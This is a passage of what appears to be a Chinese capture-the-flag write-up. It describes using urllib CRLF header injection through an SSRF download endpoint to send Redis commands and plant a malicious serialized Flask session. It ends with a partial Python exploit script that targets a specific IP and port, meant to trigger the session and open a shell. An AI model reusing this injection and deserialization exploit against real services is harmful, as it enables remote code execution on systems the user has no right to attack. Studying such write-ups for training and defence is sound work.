...
![image](https://img2018.cnblogs.com/blog/1491122/201901/1491122-20190130001520458-737612130.png)
...
经过测试，本题不仅不支持gopher协议，也没有crontab功能，故只能使用urllib头注入，然后构造恶意的序列化session这个思路。
...
但是发现返回了一个$-1，可能只有第一条的回显，也可能是指执行了第一条GET /?，这条肯定失败。那么如何测试是否控制redis成功呢？这里采用利用redis的备份命令去写一个文件，然后再去利用ssrf处的file协议读取，如果读取成功则说明控制成功，redis命令如下：
...
因为编码问题，拿不到备份的数据库，所以自己本地搭了一下这个环境。因为题目环境是python3(从http的返回头可以看出)，我这里用的是python2，所以精简了一下代码，然后把session这个库换成了flask_session（猜的，我也不知道库名这玩意去哪查），然后安装如下库：
...
直接用python脚本实现的exp，mac下直接弹shell：
...
a = requests.session()
r1 = a.post('http://47.93.12.191:7002/login/', data = {'username':'xuan'})
b = requests.session()
r2 = b.post('http://47.93.12.191:7002/login/', data = {'username':'bling'})
mysession = r2.cookies['session'][0:36]
payload = "http://127.0.0.1:6379?\r\nset \"session:"+mysession+"\" \""+shell+"\"\r\npadding"
a.post('http://47.93.12.191:7002/download/',data = {'url':payload})
b.get("http://47.93.12.191:7002")
```